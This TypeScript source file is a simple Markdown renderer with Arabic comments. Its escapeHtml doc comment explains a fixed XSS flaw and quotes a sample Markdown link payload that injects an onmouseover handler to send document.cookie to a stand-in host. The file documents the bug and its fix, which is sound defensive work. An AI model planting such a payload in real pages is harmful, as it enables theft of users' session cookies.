// عارض Markdown مبسّط وآمن (يهرّب HTML أولًا) — كافٍ لمخرجات المنصّة
export function renderMarkdown(md: string): string {
  let s = escapeHtml(md);

  // كتل الجداول البسيطة
  s = s.replace(/(^\|.+\|\n)(\|[\s:|-]+\|\n)((?:\|.*\|\n?)*)/gm, (_m, header, _sep, rows) => {
    const th = header
      .trim()
      .slice(1, -1)
      .split('|')
      .map((c: string) => `<th>${c.trim()}</th>`)
      .join('');
    const trs = rows
      .trim()
      .split('\n')
      .map((r: string) => {
        const tds = r
          .trim()
          .slice(1, -1)
          .split('|')
          .map((c: string) => `<td>${c.trim()}</td>`)
          .join('');
        return `<tr>${tds}</tr>`;
      })
      .join('');
    return `<table><thead><tr>${th}</tr></thead><tbody>${trs}</tbody></table>`;
  });

  const lines = s.split('\n');
  const out: string[] = [];
  let inList: 'ul' | 'ol' | null = null;

  const closeList = () => {
    if (inList) {
      out.push(`</${inList}>`);
      inList = null;
    }
  };

  for (const line of lines) {
    const h = line.match(/^(#{1,3})\s+(.*)$/);
    if (h) {
      closeList();
      const lvl = h[1].length;
      out.push(`<h${lvl}>${inline(h[2])}</h${lvl}>`);
      continue;
    }
    if (/^\s*---\s*$/.test(line)) {
      closeList();
      out.push('<hr>');
      continue;
    }
    const ul = line.match(/^\s*[-*•]\s+(.*)$/);
    if (ul) {
      if (inList !== 'ul') {
        closeList();
        out.push('<ul>');
        inList = 'ul';
      }
      out.push(`<li>${inline(ul[1])}</li>`);
      continue;
    }
    const ol = line.match(/^\s*\d+[.)]\s+(.*)$/);
    if (ol) {
      if (inList !== 'ol') {
        closeList();
        out.push('<ol>');
        inList = 'ol';
      }
      out.push(`<li>${inline(ol[1])}</li>`);
      continue;
    }
    if (line.trim() === '' && line.indexOf('<table>') === -1) {
      closeList();
      continue;
    }
    if (line.includes('<table>') || line.includes('</table>') || line.startsWith('<t') || line.includes('<thead')) {
      closeList();
      out.push(line);
      continue;
    }
    closeList();
    out.push(`<p>${inline(line)}</p>`);
  }
  closeList();
  return out.join('\n');
}

function inline(s: string): string {
  return s
    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
    .replace(/`([^`]+)`/g, '<code>$1</code>')
    .replace(/\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)/g, '<a href="$2" target="_blank" rel="noopener">$1</a>');
}

/**
 * تهريب ما لا يجوز أن يُقرأ بنيةً.
 *
 * **وعلامتا الاقتباس منه، وغيابهما كان ثغرةً لا نقصَ أناقة.** نمطُ الرابط
 * أعلاه يضع ما التقطه داخل `href="…"`، ونمطُه يمنع الفراغَ والقوسَ المغلق
 * ولا يمنع `"`. والشرطة المائلة فاصلُ سماتٍ صالح في تحليل HTML5 — تُقرأ
 * «إغلاق ذاتيّ» ثم يُعاد ما بعدها في حالة «قبل اسم سمة». فهذا المدخل:
 *
 *   [نصّ](https://a/b"/onmouseover="location='//x/'+document.cookie)
 *
 * كان يخرج وسمَ رابطٍ يحمل معالجَ حدثٍ حيّاً. أُعيد إنتاجه في متصفّح.
 *
 * ولا يكفي أن يُهرَّب `"` وحده: `'` يفتح البابَ نفسه في سمةٍ تُكتب بالمفرد،
 * وهذا الملف يُقرأ ويُعدَّل بعد اليوم. فالأربعة تُهرَّب كلُّها.
 */
function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
